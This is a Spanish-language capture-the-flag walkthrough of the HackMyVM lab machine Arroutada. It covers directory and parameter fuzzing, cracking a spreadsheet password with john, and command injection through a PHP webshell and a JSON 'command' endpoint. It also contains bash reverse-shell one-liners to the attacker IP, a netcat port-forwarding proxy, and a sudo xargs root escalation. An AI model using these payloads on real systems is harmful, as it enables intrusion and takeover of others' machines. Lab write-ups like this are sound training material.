# Luz HackMyVM

- Ip atacante - 10.0.2.4
- Ip victima - 10.0.2.16

## Nmap

Empezamos realizando los scaneos con nmap

```
❯ nmap -T4 -Pn -p- 10.0.2.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 17:27 EST
Nmap scan report for 10.0.2.16
Host is up (0.00044s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
```

Entrando a la pagina principal solo hay una foto asi que
decido correr el gobuster en busca de directorios

```
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.16 -x .php,.html      
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.16
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2023/02/24 17:29:03 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 274]
/index.html           (Status: 200) [Size: 59]
/.php                 (Status: 403) [Size: 274]
/imgs                 (Status: 301) [Size: 305] [--> http://10.0.2.16/imgs/]
/scout                (Status: 301) [Size: 306] [--> http://10.0.2.16/scout/]
/.html                (Status: 403) [Size: 274]
/.php                 (Status: 403) [Size: 274]
/server-status        (Status: 403) [Size: 274]
```

Dentro del directorio /scout nos dejan un mensaje que es el siguiente:

```
❯ curl "http://10.0.2.16/scout/"

Hi, Telly,
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
/scout/******/docs/
With continued gratitude,
J1.

<!-- Stop please -->

<!-- I told you to stop checking on me! -->

<!-- OK... I'm just J1, the boss. -->
```

Ok entonces realizando un ffuf entontramos un directorio mas 
```
❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.16/scout/FUZZ/docs

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.16/scout/FUZZ/docs
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

j2                      [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms]
```

Dentro del directorio /scout/j2/docs entontramos varios archivos

Buscando entre las archivos encontramos el 
- pass.txt - user:password
- shellfile.ods - (Tiene archivos adentros)
- z206 - Ignore z*, please Jabatito

Ese shellfile.ods lo vamos esta con contraseña, asi que lo mandamos con john para encontrar la contraseña.

```
❯ file shellfile.ods  
shellfile.ods: OpenDocument Spreadsheet
                                                                                
❯ libreoffice2john shellfile.ods > shellhash
                                                                                
❯ john shellhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 256/256 AVX2 8x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john11           (shellfile.ods)     
1g 0:00:00:35 DONE (2023-02-24 22:24) 0.02849g/s 471.3p/s 471.3c/s 471.3C/s lachina..emmanuel1
Use the "--show --format=ODF" options to display all of the cracked passwords reliably
Session completed.
```

Ya con la contraseña entramos al archivo que basicamente se abre con un excel o con la version de libreoffice

El archivo nos deja ver un nuevo path

![](img/arroutada1.png)

Entrando a la pagina con /thebasshell.php nos da una pagina en blanco.
Viendo bien la imagen nos dice que odia mucho hacer fuzzing. Asi que tenemos que fuzzear a ver si encontramos algo.

```
❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u 'http://10.0.2.16/thejabasshell.php?FUZZ=ls' -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.16/thejabasshell.php?FUZZ=ls
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

a                       [Status: 200, Size: 33, Words: 5, Lines: 1, Duration: 0ms]
```

Bueno viendo la pagina /thejabasshell.php?a=ls no suelta un error y dice:
- Error: Problem with parameter "b"

Visualizando esto nos damos cuenta que existe un nuevo parametro "b"

Volvemos a fuzzear ahora con el parametro de b
```
❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u 'http://10.0.2.16/thejabasshell.php?a=ls&b=FUZZ' -fs 33

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.16/thejabasshell.php?a=ls&b=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 33
________________________________________________

pass                    [Status: 200, Size: 40, Words: 1, Lines: 5, Duration: 1ms]
:: Progress: [220560/220560] :: Job [1/1] :: 20572 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

Ahora si con esto ya podemos ver que el parametro ineyectable es la a

```
❯ curl --url "http://10.0.2.16/thejabasshell.php?a=id&b=pass"                      
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Con esto ahora nos podemos spawnear una shell

```
❯ urlencode '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.4/443 0>&1"'
%2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.4%2F443%200%3E%261%22
                                                                
❯ curl --url "http://10.0.2.16/thejabasshell.php?a=%2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.4%2F443%200%3E%261%22&b=pass"

```

Y nos ponemos en escucha con ```nc -lvnp 443```

Nos mejoramos la shell con estos comandos

```
script /dev/null -c bash
```
then press CTRL + z

```
stty raw -echo;fg
reset
export TERM=xterm SHELL=bash
```

Viendo la maquina y buscando la forma de escalar hacia usuario podemos darnos cuenta que la pagina esta corriendo en el puerto 8000

```
ww-data@arroutada:/var/www/html/scout$ ss -nltp
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
LISTEN   0        4096           127.0.0.1:8000          0.0.0.0:*              
LISTEN   0        511                    *:80                  *:*
```

Ahora lo que podemos hacer es crear un proxy port con este comando

```
www-data@arroutada:/tmp$ nc -nlktp 8001 -c "nc 127.0.0.1 8000"
```

Y desde nuestra maquina atacante lanzamos un curl para ver que nos devuelve

```
curl "http://10.0.2.16:8001"              
<h1>Service under maintenance</h1>
<br>

<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->
```

Viendo esa cadena rara se que es brainfuck. Asi que voy a ver que nos quiere decir

https://www.dcode.fr/brainfuck-language

Basicamente nos dice ``all HackMyVM hackers!!``

Ahora viendo el directorio que nos propone 

```
❯ curl "http://10.0.2.16:8001/priv.php"
Error: the "command" parameter is not specified in the request body.

/*
$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}
*/
```
El script nos dice que esta esperando un command
Entonces nos ponemos en escucha por el pueto 8002

```
❯ curl -s -X POST "http://10.0.2.16:8001/priv.php" -H "Content-Type: application/json" -d '{"command": "/bin/bash -c \"/bin/bash -i &>/dev/tcp/10.0.2.4/444 0>&1\""}'
```

Ahora si tenemos una shell como el usuario Drito y la mejoramos como la shell anterior
Encontramos la primera flag

```
drito@arroutada:~$ ls
service  user.txt  web
drito@arroutada:~$ cat user.txt 
************1f9af6aa1afcc91ed27c
```
Ahora buscamos la forma de escalar privilegios

```
drito@arroutada:~$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

Buscando en gtfobins encontramos que podemos abirir una shell como root
https://gtfobins.github.io/gtfobins/xargs/

```
drito@arroutada:~$ sudo /usr/bin/xargs -a /dev/null sh
# id
uid=0(root) gid=0(root) groups=0(root)
# bash
root@arroutada:/home# cd /root
root@arroutada:~# cat root.txt 
***************OYXFOeXlVbnB4WmxJWg==
```

Al parecer la flag esta encriptada. Al parecer es base64 pero cuando la desencripto al parecer sigue encriptada en otra forma. Viendo cual era la encriptacion al parecer es ROT13

```
******************ackMyVM
```

Con esto terminamos la maquina Arroutada. Me parece una buena maquina trayendo desde lo basico a un poco mas intermedio al final. 
